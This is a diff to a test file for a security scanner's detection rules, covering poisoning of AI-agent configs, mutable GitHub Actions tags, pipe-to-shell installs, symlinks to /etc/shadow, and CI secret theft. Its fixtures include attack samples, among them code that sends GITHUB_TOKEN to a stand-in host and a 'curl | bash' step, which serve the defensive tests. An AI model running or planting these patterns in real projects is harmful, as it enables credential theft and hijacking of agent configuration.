@@ -16,8 +16,13 @@ function runCtx(id: string, c: AnalysisContext) { return getTypedRule(id)!.analy
 // ─── J — Threat Intelligence ───────────────────────────────────────────────
 
 describe("J1 — Cross-Agent Config Poisoning", () => {
-  it("flags writeFile to .claude config", () => {
-    const f = run("J1", `fs.writeFileSync('.claude/config.json', maliciousConfig);`);
+  // Updated by Phase 1 Wave 2 chunk 1.15 — J1 migrated to v2 (taint-kit).
+  // The v2 rule requires: (a) write destination is an agent-config target
+  // AND (b) payload flows from a recognised taint source (req.body, query,
+  // params, etc.). Hard-coded writes no longer flag because they have no
+  // attacker-controlled content source.
+  it("flags writeFile to .claude config with req.body-sourced content", () => {
+    const f = run("J1", `app.post('/install', (req, res) => { const data = req.body; fs.writeFileSync('/home/alice/.claude/settings.local.json', data); });`);
     expect(f.some(x => x.rule_id === "J1")).toBe(true);
     const finding = findingFor(f, "J1");
     const chain = expectEvidenceChain(finding);
@@ -295,23 +300,68 @@ describe("K20 — Insufficient Audit Context", () => {
 // ─── L — Supply Chain ──────────────────────────────────────────────────────
 
 describe("L1 — Actions Tag Poisoning", () => {
-  it("flags mutable @v1 tag", () => {
-    const f = run("L1", `uses: some-org/action@v1`);
+  // Updated by Phase 1 Wave 2 chunk 1.9 — L1 migrated to v2 (structural YAML
+  // parser for GitHub Actions workflows). A bare `uses:` line in isolation no
+  // longer fires; the rule needs a full workflow document with jobs + steps
+  // so it can reason about mitigation (harden-runner, SHA pinning, etc.).
+  it("flags mutable @v1 tag in a real workflow", () => {
+    const workflow =
+`name: CI
+on:
+  push:
+    branches: [main]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: some-org/action@v1
+      - run: npm test
+`;
+    const f = run("L1", workflow);
     expect(f.some(x => x.rule_id === "L1")).toBe(true);
     const finding = findingFor(f, "L1");
     const chain = expectEvidenceChain(finding);
     expectConfidenceRange(chain, 0.30, 0.99);
   });
-  it("flags @main branch ref", () => {
-    const f = run("L1", `uses: some-org/action@main`);
+  it("flags @main branch ref in a real workflow", () => {
+    const workflow =
+`name: CI
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: some-org/action@main
+`;
+    const f = run("L1", workflow);
     expect(f.some(x => x.rule_id === "L1")).toBe(true);
     const finding = findingFor(f, "L1");
     const chain = expectEvidenceChain(finding);
     expectConfidenceRange(chain, 0.30, 0.99);
   });
-  it("does NOT flag SHA pin", () => { expect(run("L1", `uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608`).filter(x => x.rule_id === "L1").length).toBe(0); });
-  it("flags curl|bash pipe", () => {
-    const f = run("L1", `curl https://install.sh | bash`);
+  it("does NOT flag SHA pin", () => {
+    const workflow =
+`name: CI
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608
+`;
+    expect(run("L1", workflow).filter(x => x.rule_id === "L1").length).toBe(0);
+  });
+  it("flags curl|bash pipe inside a step", () => {
+    const workflow =
+`name: CI
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl https://install.sh | bash
+`;
+    const f = run("L1", workflow);
     expect(f.some(x => x.rule_id === "L1")).toBe(true);
     const finding = findingFor(f, "L1");
     const chain = expectEvidenceChain(finding);
@@ -358,15 +408,19 @@ describe("L5 — Manifest Confusion", () => {
 });
 
 describe("L6 — Config Symlink Attack", () => {
-  it("flags symlink to /etc/", () => {
-    const f = run("L6", `fs.symlinkSync('/etc/shadow', './link');`);
+  // Updated by Phase 1 Wave 2 chunk 1.9 — L6 v2 detects Node `fs.symlink*`
+  // calls where target = sensitive system path and linkpath = attacker-
+  // reachable config dir. The legacy regex-era test cases that used
+  // `os.symlink(...)` (Python syntax) no longer apply.
+  it("flags fs.symlinkSync to /etc/", () => {
+    const f = run("L6", `import fs from "node:fs";\nfs.symlinkSync('/etc/shadow', '.claude/link.json');`);
     expect(f.some(x => x.rule_id === "L6")).toBe(true);
     const finding = findingFor(f, "L6");
     const chain = expectEvidenceChain(finding);
     expectConfidenceRange(chain, 0.30, 0.99);
   });
-  it("flags symlink to .claude config", () => {
-    const f = run("L6", `os.symlink('/home/user/.claude/config', './link')`);
+  it("flags fs.symlinkSync targeting .claude/settings.json", () => {
+    const f = run("L6", `import fs from "node:fs";\nfs.symlinkSync('.claude/settings.json', '.claude/shared-config.json');`);
     expect(f.some(x => x.rule_id === "L6")).toBe(true);
     const finding = findingFor(f, "L6");
     const chain = expectEvidenceChain(finding);
@@ -385,8 +439,16 @@ describe("L7 — Transitive MCP Delegation", () => {
 });
 
 describe("L9 — CI Secret Exfiltration", () => {
-  it("flags JSON.stringify(process.env)", () => {
-    const f = run("L9", `JSON.stringify(process.env)`);
+  // Updated by Phase 1 Wave 2 chunk 1.14 — L9 v2 requires an env→sink path
+  // (env read + network send or console.log). A bare JSON.stringify with no
+  // sink no longer triggers.
+  it("flags env→fetch exfiltration (CVE-2025-30066 shape)", () => {
+    const src =
+`async function publish() {
+  const token = process.env.GITHUB_TOKEN;
+  await fetch("https://telemetry.example.invalid/report", { method: "POST", body: token });
+}`;
+    const f = run("L9", src);
     expect(f.some(x => x.rule_id === "L9")).toBe(true);
     const finding = findingFor(f, "L9");
     const chain = expectEvidenceChain(finding);
